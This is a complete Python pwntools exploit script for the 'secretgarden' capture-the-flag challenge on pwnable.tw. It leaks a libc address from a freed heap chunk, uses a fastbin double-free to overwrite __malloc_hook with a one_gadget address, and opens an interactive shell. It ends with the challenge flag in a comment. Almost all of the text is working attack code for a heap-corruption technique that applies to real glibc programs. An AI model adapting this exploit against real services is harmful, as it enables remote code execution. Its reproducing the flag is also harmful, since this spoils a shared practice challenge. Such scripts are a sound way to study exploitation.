from pwn import *

elf = ELF("secretgarden")
libc = ELF("libc_64.so.6")
r = remote('chall.pwnable.tw', 10203)
one_gadget = 0xef6c4


def Sendraw(s):
    r.send_raw(s)


def Sendline(s):
    r.sendline(s)


def RaiseFlower(name_size, name, color):
    Sendline('1')
    r.read(),
    Sendline(str(name_size))
    r.read(),
    Sendraw(name)
    r.read(),
    Sendline(color)
    r.readline(),


def VisitFlower():
    Sendline('2')
    lines = []
    while True:
        line = r.readline()
        if line.find(b'of the flower') != -1:
            line = line.rstrip(b'\n')
            lines.append(line)
        else:
            break
    return lines


def RemoveFlower(i):
    Sendline('3')
    r.read(),
    Sendline(str(i))


def ClearGarden():
    Sendline('4')


def ExitGarden():
    Sendline('5')


sleep(0.5)

# leak libc addr
with log.progress("leaking libc address") as l:
    r.read(),
    RaiseFlower(1024, b'fuck', b'fuck')
    r.read(),
    RaiseFlower(1024, b'fuck', b'fuck')
    r.read(),
    RemoveFlower(0)
    r.read(),
    RaiseFlower(512, b'fuckfuck', b'fuck')
    r.read(),
    recv = VisitFlower()[2]
    libc_base = u64(recv[recv.find(b'fuckfuck') + 8:].ljust(8, b'\x00')) - 0x3C3B78
    libc_malloc_hook_addr = libc_base + 0x3C3B10
    l.success(hex(libc_base))
    log.success('libc_malloc_hook --> %s' % hex(libc_malloc_hook_addr))

with log.progress("clearing chunks") as l:
    # clear
    for _ in range(0, 2):
        l.status("%d/2" % int(_ + 1))
        r.read(),
        RemoveFlower(_ + 1)
        r.read(),

    ClearGarden()
    l.status("garden cleared")
    sleep(1)

# Fast-bin attack
# 0x68 = 0x78 - 0x10
with log.progress("fast-bin attack") as l:
    r.read(),
    RaiseFlower(0x68, b'AAAA', b'BBBB')  # 0
    r.read(),
    RaiseFlower(0x68, b'CCCC', b'DDDD')  # 1
    r.read(),
    RemoveFlower(1)
    r.read(),
    RemoveFlower(0)
    r.read(),
    RemoveFlower(1)
    r.read(),
    RaiseFlower(0x68, pack(libc_malloc_hook_addr - 0x23, 64), b'EEEE')  # 2
    r.read(),
    RaiseFlower(0x68, b'FFFF', b'FFFF')  # 3
    r.read(),
    RaiseFlower(0x68, b'AAAA', b'BBBB')  # 4
    r.read(),
    RaiseFlower(0x68, b'A' * (0x23 - 0x10) + p64(libc_base + one_gadget), b'CCCC')  # 5
    l.success()

with log.progress("triggering malloc_hook") as l:
    # trigger malloc_hook
    r.read(),
    RemoveFlower(0)
    r.read(),
    Sendline('3')
    r.read(),
    Sendline('0')
    r.recvuntil("garden:")
    l.success()
    r.interactive()

# FLAG --> FLAG{FastBiN_C0rruption_t0_BUrN_7H3_G4rd3n}
